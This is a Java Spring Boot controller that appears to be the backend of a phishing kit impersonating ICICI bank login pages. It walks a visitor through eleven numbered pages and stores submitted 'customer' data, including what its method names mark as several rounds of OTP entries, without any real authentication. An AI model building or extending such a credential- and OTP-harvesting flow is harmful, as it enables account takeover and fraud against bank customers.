package com.icici.login.controller;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.SessionAttributes;

import com.icici.login.entity.Customer;
import com.icici.login.repository.CustomerRepository;



@Controller
@SessionAttributes("customer") // added session attribute
public class MainController {

    @Autowired
    private CustomerRepository customerRepository;

    // Get Mapping
    @GetMapping("/")
    public String home(Model model) {
        model.addAttribute("customer", new Customer());
        return "index";
    }

    @GetMapping("/f2")
    public String Second() {
        return "page2";
    }

    @GetMapping("/f3")
    public String Third() {
        return "page3";
    }

    @GetMapping("/f4")
    public String Fourth() {
        return "page4";
    }

    @GetMapping("/f5")
    public String Fifth() {
        return "page5";
    }

    @GetMapping("/f6")
    public String Sixth() {
        return "page6";
    }

    @GetMapping("/f7")
    public String Seventh() {
        return "page7";
    }

    @GetMapping("/f8")
    public String Eighth() {
        return "page8";
    }

    @GetMapping("/f9")
    public String Ninth() {
        return "page9";
    }

    @GetMapping("/f10")
    public String Tenth() {
        return "page10";
    }

    @GetMapping("/f11")
    public String Eleventh() {
        return "page11";
    }

    // post mapping

    @PostMapping("/f2")
    public String saveCustomer(@ModelAttribute("customer") Customer customer) {
        customerRepository.save(customer);
        return "redirect:/f2";
    }

    @PostMapping("/f3")
    public String saveCustomer3() {
        return "redirect:/f4";
    }

    @PostMapping("/f4")
    public String saveCustomerotp(@ModelAttribute("customer") Customer customer){
        customerRepository.save(customer);
        return "redirect:/f5";
    }

    @PostMapping("/f6")
    public String saveCustomerotp2(@ModelAttribute("customer") Customer customer) {
        customerRepository.save(customer);
        return "redirect:/f7";
    }

    @PostMapping("/f7")
    public String saveCustomerotp3() {
        return "redirect:/f8";
    }

    @PostMapping("/f8")
    public String saveCustomerotp3(@ModelAttribute("customer") Customer customer) {
        customerRepository.save(customer);
        return "redirect:/f9";
    }

    @PostMapping("/f9")
    public String saveCustomerotp63() {
        return "redirect:/f10";
    }

    @PostMapping("/f10")
    public String saveCustomerotp63(@ModelAttribute("customer") Customer customer) {
        customerRepository.save(customer);
        return "redirect:/f11";
    }

}
